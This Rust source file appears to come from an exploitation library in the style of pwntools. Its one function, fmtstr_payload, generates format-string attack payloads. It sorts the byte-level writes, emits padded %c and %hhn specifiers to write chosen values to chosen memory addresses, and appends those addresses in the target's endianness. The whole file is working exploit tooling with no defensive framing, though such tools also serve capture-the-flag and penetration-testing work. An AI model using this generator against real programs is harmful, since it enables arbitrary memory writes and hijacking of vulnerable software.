use crate::context::{self, Endian};

pub fn fmtstr_payload(offset: usize, writes: &[(u64, u64)]) -> Vec<u8> {
    let ctx = context::get();
    let word_size = (ctx.bits / 8) as usize;
    let mut byte_writes = Vec::new();

    for (addr, value) in writes {
        let bytes = match ctx.endian {
            Endian::Little => value.to_le_bytes(),
            Endian::Big => value.to_be_bytes(),
        };
        let slice = match ctx.endian {
            Endian::Little => &bytes[..word_size],
            Endian::Big => &bytes[8 - word_size..],
        };
        for (index, byte) in slice.iter().enumerate() {
            byte_writes.push((addr + index as u64, *byte));
        }
    }

    byte_writes.sort_by_key(|(_, byte)| *byte);

    let mut format = Vec::new();
    let mut previous_len = usize::MAX;

    for _ in 0..10 {
        let base_index = offset + format.len().div_ceil(word_size);
        let mut next = String::new();
        let mut printed = 0u16;

        for (index, (_, byte)) in byte_writes.iter().enumerate() {
            let target = *byte as u16;
            let delta = if target >= printed {
                target - printed
            } else {
                256 - printed + target
            };
            if delta > 0 {
                next.push_str(&format!("%{delta}c"));
            }
            next.push_str(&format!("%{}$hhn", base_index + index));
            printed = target;
        }

        let align = (word_size - (next.len() % word_size)) % word_size;
        next.extend(std::iter::repeat_n('A', align));

        if next.len() == previous_len {
            format = next.into_bytes();
            break;
        }

        previous_len = next.len();
        format = next.into_bytes();
    }

    let mut payload = format;
    for (addr, _) in &byte_writes {
        match (word_size, ctx.endian) {
            (8, Endian::Little) => payload.extend_from_slice(&addr.to_le_bytes()),
            (8, Endian::Big) => payload.extend_from_slice(&addr.to_be_bytes()),
            (4, Endian::Little) => payload.extend_from_slice(&(*addr as u32).to_le_bytes()),
            (4, Endian::Big) => payload.extend_from_slice(&(*addr as u32).to_be_bytes()),
            _ => unreachable!(),
        }
    }

    payload
}
